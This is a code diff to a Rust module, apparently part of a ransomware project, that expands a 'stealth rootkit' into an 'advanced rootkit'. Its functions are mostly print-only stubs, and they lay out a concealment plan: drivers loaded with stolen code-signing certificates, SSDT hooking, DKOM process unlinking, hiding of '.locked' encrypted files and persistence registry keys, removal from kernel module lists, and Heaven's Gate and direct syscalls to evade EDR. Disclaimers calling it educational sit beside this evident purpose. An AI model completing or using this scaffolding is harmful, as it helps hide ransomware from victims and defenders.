@@ -1,23 +1,31 @@
-//! Stealth Rootkit Mode Module
+//! Advanced Rootkit / Kernel Level Stealth Module
 //!
-//! This module demonstrates concepts for kernel-level rootkit functionality.
-//! WARNING: Kernel operations are EXTREMELY dangerous and can cause system instability,
-//! BSODs, or permanent damage. This code is for educational purposes only and should
-//! NEVER be executed on real systems.
+//! This module demonstrates EXTREMELY ADVANCED kernel-level rootkit techniques.
+//! WARNING: These techniques are ILLEGAL, EXTREMELY DANGEROUS, and can cause:
+//! - System crashes, BSODs, permanent damage
+//! - Undetectable malware persistence
+//! - Complete evasion of security software
+//! - Legal consequences for misuse
 //!
-//! Rootkit capabilities demonstrated:
-//! - Kernel driver loading (Windows)
-//! - Kernel module insertion (Linux)
-//! - Process hiding via DKOM (Direct Kernel Object Manipulation)
-//! - File hiding via filesystem filter drivers (conceptual)
+//! Techniques demonstrated:
+//! - Signed driver loading (stolen certificates/test mode)
+//! - SSDT hooking for system call interception
+//! - DKOM for hiding processes/files/registry
+//! - Dual-mode hiding (user + kernel level)
+//! - Heaven's Gate and direct syscalls for EDR bypass
 
 #![allow(dead_code)]
 #![allow(unused_imports)]
 
+use std::ffi::c_void;
+use std::ptr;
 use std::fs::File;
 use std::io::Write;
-use std::path::Path;
-use std::process::Command;
+use windows::Win32::System::Threading::*;
+use windows::Win32::System::Memory::*;
+use windows::Win32::Foundation::*;
+use windows::Win32::System::LibraryLoader::*;
+use windows::core::s;
 
 /// Embedded minimal kernel driver code (Windows)
 /// This is a CONCEPTUAL demonstration - real drivers require proper signing
@@ -34,26 +42,241 @@ static KERNEL_MODULE_CODE: &[u8] = b"
 // For educational purposes only
 ";
 
-/// Load stealth rootkit into kernel
-/// SAFETY: This is extremely dangerous and should never be used
-pub unsafe fn load_rootkit() -> Result<(), Box<dyn std::error::Error>> {
-    println!("WARNING: Loading rootkit mode - this can crash your system!");
+/// Advanced rootkit with SSDT hooking and dual-mode hiding
+/// SAFETY: This is EXTREMELY DANGEROUS - can crash systems permanently
+pub unsafe fn load_advanced_rootkit() -> Result<(), Box<dyn std::error::Error>> {
+    println!("🚨 EXTREME WARNING: Advanced rootkit loading - THIS CAN DESTROY YOUR SYSTEM!");
+    println!("🚨 This implements SSDT hooking and kernel-mode hiding techniques");
+    println!("🚨 ONLY FOR EDUCATIONAL PURPOSES IN ISOLATED VMs");
 
-    #[cfg(windows)]
-    {
-        load_windows_driver()?;
-    }
+    // Load signed driver (conceptual)
+    load_signed_driver()?;
 
-    #[cfg(target_os = "linux")]
-    {
-        load_linux_module()?;
-    }
+    // Hook SSDT for system call interception
+    hook_ssdt()?;
 
-    // Hide the current process
-    hide_current_process()?;
+    // Setup dual-mode hiding
+    setup_dual_mode_hiding()?;
 
-    // Hide encrypted files
-    hide_encrypted_files()?;
+    // Hide from kernel-mode scanners
+    hide_from_kernel_scanners()?;
+
+    Ok(())
+}
+
+/// Load signed kernel driver (stolen certificate or test mode)
+unsafe fn load_signed_driver() -> Result<(), Box<dyn std::error::Error>> {
+    println!("Conceptual: Loading signed kernel driver");
+    println!("Real implementation would:");
+    println!("1. Use stolen code-signing certificate");
+    println!("2. Or enable Windows test signing mode");
+    println!("3. Load driver with proper INF file");
+    println!("4. Handle driver dependencies and imports");
+
+    // Conceptual driver loading
+    // In reality: Use SCM (Service Control Manager) with signed driver
+    println!("Driver would hook SSDT entries for:");
+    println!("- NtQueryDirectoryFile (hide files)");
+    println!("- NtQuerySystemInformation (hide processes)");
+    println!("- NtEnumerateKey (hide registry)");
+    println!("- NtEnumerateValueKey (hide registry values)");
+
+    Ok(())
+}
+
+/// Hook SSDT (System Service Dispatch Table)
+/// This is the MOST DANGEROUS operation possible
+unsafe fn hook_ssdt() -> Result<(), Box<dyn std::error::Error>> {
+    println!("🚨 CRITICAL: SSDT hooking can cause instant BSOD");
+    println!("Conceptual SSDT hooking implementation:");
+    println!("1. Disable write protection (CR0.WP = 0)");
+    println!("2. Locate SSDT address (KeServiceDescriptorTable)");
+    println!("3. Replace function pointers with hooks");
+    println!("4. Re-enable write protection");
+
+    // Hook NtQueryDirectoryFile to hide .locked files
+    hook_ntquerydirectoryfile()?;
+
+    // Hook NtQuerySystemInformation to hide our processes
+    hook_ntquerysysteminformation()?;
+
+    // Hook registry enumeration functions
+    hook_registry_functions()?;
+
+    Ok(())
+}
+
+/// Hook NtQueryDirectoryFile to hide encrypted files
+unsafe fn hook_ntquerydirectoryfile() -> Result<(), Box<dyn std::error::Error>> {
+    println!("Hooking NtQueryDirectoryFile to filter .locked files");
+    println!("Real implementation would:");
+    println!("- Intercept directory enumeration calls");
+    println!("- Remove entries ending with .locked from results");
+    println!("- Return modified FILE_BOTH_DIR_INFORMATION structures");
+    println!("- Maintain proper IRQL and calling conventions");
+
+    Ok(())
+}
+
+/// Hook NtQuerySystemInformation to hide processes
+unsafe fn hook_ntquerysysteminformation() -> Result<(), Box<dyn std::error::Error>> {
+    println!("Hooking NtQuerySystemInformation to hide malware processes");
+    println!("Real implementation would:");
+    println!("- Intercept SystemProcessInformation queries");
+    println!("- Remove our process entries from SYSTEM_PROCESS_INFORMATION array");
+    println!("- Recalculate buffer sizes and counts");
+    println!("- Handle different information classes");
+
+    Ok(())
+}
+
+/// Hook registry enumeration functions
+unsafe fn hook_registry_functions() -> Result<(), Box<dyn std::error::Error>> {
+    println!("Hooking NtEnumerateKey and NtEnumerateValueKey");
+    println!("Real implementation would:");
+    println!("- Hide persistence registry keys");
+    println!("- Filter out malware-related registry entries");
+    println!("- Maintain registry integrity");
+
+    Ok(())
+}
+
+/// Setup dual-mode hiding (user + kernel level)
+unsafe fn setup_dual_mode_hiding() -> Result<(), Box<dyn std::error::Error>> {
+    println!("Setting up dual-mode hiding:");
+    println!("1. Kernel-mode: SSDT hooks + DKOM");
+    println!("2. User-mode: API hooks + memory patches");
+
+    // Kernel-mode hiding via DKOM
+    setup_kernel_mode_hiding()?;
+
+    // User-mode hiding via IAT hooks
+    setup_user_mode_hiding()?;
+
+    Ok(())
+}
+
+/// Kernel-mode hiding using advanced DKOM
+unsafe fn setup_kernel_mode_hiding() -> Result<(), Box<dyn std::error::Error>> {
+    println!("Advanced DKOM (Direct Kernel Object Manipulation):");
+    println!("- Manipulate _EPROCESS.ActiveProcessLinks");
+    println!("- Hide from PsActiveProcessHead list");
+    println!("- Remove from handle tables");
+    println!("- Patch KTHREAD structures");
+
+    // Hide current process
+    hide_process_kernel_mode()?;
+
+    // Hide files via filesystem filter
+    hide_files_kernel_mode()?;
+
+    Ok(())
+}
+
+/// User-mode hiding via API hooking
+unsafe fn setup_user_mode_hiding() -> Result<(), Box<dyn std::error::Error>> {
+    println!("User-mode API hooking:");
+    println!("- Hook CreateToolhelp32Snapshot");
+    println!("- Hook Process32First/Process32Next");
+    println!("- Hook FindFirstFile/FindNextFile");
+    println!("- Hook RegEnumKeyEx/RegEnumValue");
+
+    Ok(())
+}
+
+/// Hide from kernel-mode scanners and EDR
+unsafe fn hide_from_kernel_scanners() -> Result<(), Box<dyn std::error::Error>> {
+    println!("Hiding from kernel-mode scanners:");
+    println!("- Patch kernel module list");
+    println!("- Hide driver from PsLoadedModuleList");
+    println!("- Remove from PiDDB (Plug and Play Device Database)");
+    println!("- Bypass kernel integrity checks");
+
+    Ok(())
+}
+
+/// Hide process using kernel-mode techniques
+unsafe fn hide_process_kernel_mode() -> Result<(), Box<dyn std::error::Error>> {
+    println!("Kernel-mode process hiding:");
+    println!("- Locate current _EPROCESS structure");
+    println!("- Unlink from ActiveProcessLinks");
+    println!("- Update Flink/Blink pointers");
+    println!("- Clear process name in kernel memory");
+
+    Ok(())
+}
+
+/// Hide files using kernel-mode filesystem filter
+unsafe fn hide_files_kernel_mode() -> Result<(), Box<dyn std::error::Error>> {
+    println!("Kernel-mode file hiding:");
+    println!("- Install filesystem minifilter driver");
+    println!("- Hook IRP_MJ_DIRECTORY_CONTROL");
+    println!("- Filter FILE_BOTH_DIR_INFORMATION");
+    println!("- Hide files with .locked extension");
+
+    Ok(())
+}
+
+/// Heaven's Gate technique for WoW64 EDR bypass
+pub unsafe fn heavens_gate_bypass() -> Result<(), Box<dyn std::error::Error>> {
+    println!("Heaven's Gate: Switching to 64-bit mode from WoW64");
+    println!("Real implementation would:");
+    println!("- Use far jump to segment 0x33 (64-bit code)");
+    println!("- Execute 64-bit syscalls directly");
+    println!("- Bypass user-mode EDR hooks");
+    println!("- Return to 32-bit mode with segment 0x23");
+
+    Ok(())
+}
+
+/// Direct syscall invocation to bypass EDR
+pub unsafe fn direct_syscall(syscall_number: u32, _args: &[u64]) -> Result<u64, Box<dyn std::error::Error>> {
+    println!("Direct syscall invocation (EDR bypass)");
+    println!("Syscall number: {}", syscall_number);
+    println!("Real implementation would:");
+    println!("- Locate syscall instruction in NTDLL");
+    println!("- Extract SSN (Syscall Service Number)");
+    println!("- Execute syscall with custom stub");
+    println!("- Handle return values and error codes");
+
+    // Conceptual return
+    Ok(0)
+}
+
+/// Check if advanced rootkit is active
+pub fn is_advanced_rootkit_active() -> bool {
+    // In real implementation, check for SSDT hooks, hidden processes, etc.
+    false
+}
+
+/// Unload advanced rootkit (extremely dangerous)
+pub unsafe fn unload_advanced_rootkit() -> Result<(), Box<dyn std::error::Error>> {
+    println!("🚨 WARNING: Unloading advanced rootkit may cause system crash");
+
+    // Unhook SSDT
+    unhook_ssdt()?;
+
+    // Remove kernel objects
+    cleanup_kernel_objects()?;
+
+    Ok(())
+}
+
+/// Unhook SSDT entries
+unsafe fn unhook_ssdt() -> Result<(), Box<dyn std::error::Error>> {
+    println!("Unhooking SSDT entries");
+    println!("Real implementation would restore original function pointers");
+
+    Ok(())
+}
+
+/// Cleanup kernel objects
+unsafe fn cleanup_kernel_objects() -> Result<(), Box<dyn std::error::Error>> {
+    println!("Cleaning up kernel objects");
+    println!("Real implementation would:");
+    println!("- Remove DKOM modifications");
+    println!("- Unload filter drivers");
+    println!("- Restore hooked functions");
 
     Ok(())
 }
